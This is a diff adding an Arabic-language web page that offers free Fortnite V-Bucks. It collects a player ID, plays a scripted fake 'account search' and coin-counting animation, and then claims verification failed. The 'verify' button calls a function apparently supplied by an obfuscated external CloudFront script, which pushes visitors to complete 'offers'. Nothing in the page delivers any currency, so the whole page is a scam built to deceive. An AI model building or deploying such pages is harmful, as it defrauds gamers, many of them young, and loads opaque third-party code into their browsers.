@@ -1,0 +1,415 @@
+<!DOCTYPE html><html lang="ar" dir="rtl"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>  شحن فيبوكس مجانا في لعبة فورت نايت  </title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: #1a1a2e;
+            color: #ffffff;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            background-color: #16213e;
+            padding: 20px;
+            text-align: center;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 80px;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        .title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #fca311;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            color: #e5e5e5;
+        }
+
+        .main-content {
+            background-color: #0f3460;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+
+        .form-section {
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #fca311;
+            font-size: 1rem;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            background-color: #16213e;
+            color: #ffffff;
+            border-radius: 5px;
+            font-size: 1rem;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px #fca311;
+        }
+
+        .platform-options,
+        .Vbucks-options {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        .option-btn {
+            background-color: #16213e;
+            color: #ffffff;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        .option-btn i {
+            margin-left: 5px;
+        }
+
+        .option-btn:hover {
+            background-color: #1f3a5f;
+        }
+
+        .option-btn.selected {
+            background-color: #fca311;
+            color: #16213e;
+        }
+
+        .submit-btn {
+            background-color: #fca311;
+            color: #16213e;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            display: block;
+            width: 100%;
+            margin-top: 20px;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        .submit-btn:hover {
+            background-color: #e5900f;
+        }
+
+        .security-info {
+            font-size: 0.8rem;
+            color: #e5e5e5;
+            margin-top: 15px;
+            text-align: center;
+        }
+
+        #processing-screen,
+        #Vbucks-counter-screen,
+        #verification-screen {
+            display: none;
+        }
+
+        .progress-container {
+            background-color: #16213e;
+            border-radius: 5px;
+            margin: 20px 0;
+            height: 20px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            width: 0;
+            height: 100%;
+            background-color: #fca311;
+            transition: width 0.5s ease;
+        }
+
+        .step {
+            margin: 10px 0;
+            padding: 10px;
+            background-color: #16213e;
+            border-radius: 5px;
+            opacity: 0.5;
+            transition: opacity 0.3s ease;
+        }
+
+        .step.active {
+            opacity: 1;
+            background-color: #1f3a5f;
+        }
+
+        #Vbucks-counter-screen {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .Vbucks-counter-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .Vbucks-image {
+            width: 50px;
+            height: 50px;
+            margin-left: 10px;
+        }
+
+        .Vbucks-counter {
+            font-size: 3rem;
+            font-weight: 700;
+            color: #fca311;
+        }
+
+        #verification-screen {
+            text-align: center;
+            padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        #verify-btn {
+            background-color: #fca311;
+            color: #16213e;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            display: inline-block;
+            margin-top: 20px;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        #verify-btn:hover {
+            background-color: #e5900f;
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                max-width: 720px;
+            }
+            .platform-options,
+            .Vbucks-options {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="all.min.css">
+</head>
+
+<body>
+    <div class="container">
+        <header class="header">
+            <img src="undefined-Imgur.png" alt="FORTNITE Mobile Logo" class="logo">
+            <h1 class="title"> شحن فيبوكس مجانا </h1>
+        </header>
+        <main class="main-content">
+            <section class="form-section" id="main-form">
+                <div class="input-group">
+                    <label for="FORTNITE-username">ادخل معرف اللاعب (ID)</label>
+                    <input type="text" id="FORTNITE-username" placeholder="أدخل معرف اللاعب هنا">
+                </div>
+                <div class="input-group">
+                    <label>اختر المنصة</label>
+                    <div class="platform-options">
+                        <button class="option-btn" data-platform="MOBILE"><i class="fa-solid fa-mobile"></i> الهاتف </button>
+                        <button class="option-btn" data-platform="PS,XBOX"><i class="fa-brands fa-playstation"></i> PS &amp; XBOX</button>
+                        <button class="option-btn" data-platform="PC"><i class="fas fa-desktop"></i> كمبيوتر</button>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>اختر كمية Vbucks</label>
+                    <div class="Vbucks-options">
+                        <button class="option-btn" data-vbucks="600">600 Vbucks</button>
+                        <button class="option-btn" data-vbucks="1280">1280 Vbucks</button>
+                        <button class="option-btn" data-vbucks="1680">1680 Vbucks</button>
+                        <button class="option-btn" data-vbucks="2400">2400 Vbucks</button>
+                        <button class="option-btn" data-vbucks="3600">3600 Vbucks</button>
+                        <button class="option-btn" data-vbucks="5000">5000 Vbucks</button>
+                    </div>
+                </div>
+                <button class="submit-btn" id="submit-btn">شحن Vbucks الآن</button>
+                <div class="security-info">🔒 جميع المعاملات آمنة ومشفرة</div>
+            </section>
+            <section id="processing-screen" class="form-section">
+                <h2>جاري معالجة طلبك...</h2>
+                <div class="progress-container">
+                    <div class="progress-bar" id="progress-bar"></div>
+                </div>
+                <div class="step" id="step-1">البحث عن الحساب: <span id="user-id"></span></div>
+                <div class="step" id="step-2">تم العثور على الحساب</div>
+                <div class="step" id="step-3">جاري إرسال الشدات</div>
+                <div class="step" id="step-4">عملية التحقق </div>
+            </section>
+            <section id="Vbucks-counter-screen" class="form-section">
+                <h2>جاري تحضير الكوينز</h2>
+                <div class="Vbucks-counter-container">
+                    <img src="Daco-2764573.png" alt="Vbucks Coins" class="Vbucks-image">
+                    <div class="Vbucks-counter" id="Vbucks-counter">0</div>
+                </div>
+            </section>
+            <section id="verification-screen" class="form-section">
+                <h2>تعذر إتمام العملية</h2>
+                <p>يرجى إكمال عملية التحقق للحصول على الـ Vbucks</p>
+                <p> تعذر عملية التحقق يجب اكمال الخطوة التالية الضغط على زر اتمام عملية التحقق واكمال المهام يجب اكمال عرضين لبدء ارسال الفيبوكس الى حسابك في فورتنايت </p>
+                <button onclick="_kt()" id="verify-btn">تحقق الآن</button>
+            </section>
+        </main>
+    </div>
+    <script>
+        const FORTNITEUsernameInput = document.getElementById('FORTNITE-username');
+        const submitBtn = document.getElementById('submit-btn');
+        const mainForm = document.getElementById('main-form');
+        const processingScreen = document.getElementById('processing-screen');
+        const VbucksCounterScreen = document.getElementById('Vbucks-counter-screen');
+        const verificationScreen = document.getElementById('verification-screen');
+        const progressBar = document.getElementById('progress-bar');
+        const userId = document.getElementById('user-id');
+        const verifyBtn = document.getElementById('verify-btn');
+        const VbucksCounter = document.getElementById('Vbucks-counter');
+
+        let selectedPlatform = '';
+        let selectedVbucks = 0;
+
+        const coinSound = new Audio('');
+
+        document.querySelectorAll('.platform-options .option-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                selectedPlatform = this.getAttribute('data-platform');
+                document.querySelectorAll('.platform-options .option-btn').forEach(btn => {
+                    btn.classList.remove('selected');
+                });
+                this.classList.add('selected');
+            });
+        });
+
+        document.querySelectorAll('.Vbucks-options .option-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                selectedVbucks = parseInt(this.getAttribute('data-Vbucks'));
+                document.querySelectorAll('.Vbucks-options .option-btn').forEach(btn => {
+                    btn.classList.remove('selected');
+                });
+                this.classList.add('selected');
+            });
+        });
+
+        submitBtn.addEventListener('click', function() {
+            if (FORTNITEUsernameInput.value && selectedPlatform && selectedVbucks) {
+                startProcessing();
+            } else {
+                alert('يرجى ملء جميع الحقول المطلوبة.');
+            }
+        });
+
+        function startProcessing() {
+            mainForm.style.display = 'none';
+            processingScreen.style.display = 'block';
+            userId.textContent = FORTNITEUsernameInput.value;
+
+            let progress = 0;
+            const steps = document.querySelectorAll('.step');
+            const interval = setInterval(() => {
+                progress += 5;
+                progressBar.style.width = `${progress}%`;
+
+                if (progress >= 25 && !steps[0].classList.contains('active')) {
+                    steps[0].classList.add('active');
+                }
+                if (progress >= 50 && !steps[1].classList.contains('active')) {
+                    steps[1].classList.add('active');
+                }
+                if (progress >= 75 && !steps[2].classList.contains('active')) {
+                    steps[2].classList.add('active');
+                }
+                if (progress >= 100) {
+                    steps[3].classList.add('active');
+                    clearInterval(interval);
+                    setTimeout(showVbucksCounter, 1000);
+                }
+            }, 200);
+        }
+
+        function showVbucksCounter() {
+            processingScreen.style.display = 'none';
+            VbucksCounterScreen.style.display = 'block';
+
+            let count = 0;
+            const interval = setInterval(() => {
+                count += Math.floor(selectedVbucks / 100);
+                if (count > selectedVbucks) {
+                    count = selectedVbucks;
+                }
+                VbucksCounter.textContent = count.toLocaleString();
+                coinSound.play();
+
+                if (count >= selectedVbucks) {
+                    clearInterval(interval);
+                    setTimeout(showVerification, 1000);
+                }
+            }, 50);
+        }
+
+        function showVerification() {
+            VbucksCounterScreen.style.display = 'none';
+            verificationScreen.style.display = 'block';
+            
+        };
+    </script>
+
+
+<script type="text/javascript">
+    var cdINH_OwJ_mdIovc={"it":4397235,"key":"6e163"};
+</script>
+<script src="https://d2rst8vhtu89fd.cloudfront.net/2c10d1c.js"></script>
+
+</body></html>
